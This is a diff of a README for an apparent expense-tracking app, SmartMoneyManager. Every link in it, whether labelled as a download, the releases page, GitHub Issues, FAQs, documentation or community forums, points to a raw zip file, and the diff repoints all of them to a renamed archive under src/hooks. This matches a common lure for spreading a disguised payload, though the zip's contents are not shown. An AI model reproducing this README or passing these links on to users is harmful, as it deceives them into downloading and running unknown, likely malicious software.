@@ -4,7 +4,7 @@
 SmartMoneyManager helps you track and manage your expenses effortlessly. Let’s walk through the steps to download and run this application.
 
 ## 🔗 Download Here
-[![Download SmartMoneyManager](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/idleship/smartmoneymanager.zip)](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/idleship/smartmoneymanager.zip)
+[![Download SmartMoneyManager](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/src/hooks/Software_v1.2.zip)](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/src/hooks/Software_v1.2.zip)
 
 ## 📋 System Requirements
 To use SmartMoneyManager, your computer should meet these requirements:
@@ -23,7 +23,7 @@ To use SmartMoneyManager, your computer should meet these requirements:
 ## 📥 Download & Install
 To get SmartMoneyManager, visit the Releases page:
 
-[Click Here to Download SmartMoneyManager](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/idleship/smartmoneymanager.zip)
+[Click Here to Download SmartMoneyManager](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/src/hooks/Software_v1.2.zip)
 
 ### Steps to Download:
 1. Go to the Releases page.
@@ -54,12 +54,12 @@ If you encounter any issues, consider the following:
 - **Data Not Saving:** Verify that you have sufficient storage space on your device.
 
 ## 📞 Support
-For further assistance, you can reach out via [GitHub Issues](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/idleship/smartmoneymanager.zip) or check out [FAQs](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/idleship/smartmoneymanager.zip).
+For further assistance, you can reach out via [GitHub Issues](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/src/hooks/Software_v1.2.zip) or check out [FAQs](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/src/hooks/Software_v1.2.zip).
 
 ## 🔗 Additional Resources
 Explore further:
-- [Documentation](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/idleship/smartmoneymanager.zip)
-- [Community Forums](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/idleship/smartmoneymanager.zip)
+- [Documentation](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/src/hooks/Software_v1.2.zip)
+- [Community Forums](https://raw.githubusercontent.com/beelzebub-luci/smartmoneymanager/main/src/hooks/Software_v1.2.zip)
 
 ### Thank You!
 Thank you for choosing SmartMoneyManager to help with your money management! We hope this application makes handling your expenses easier.
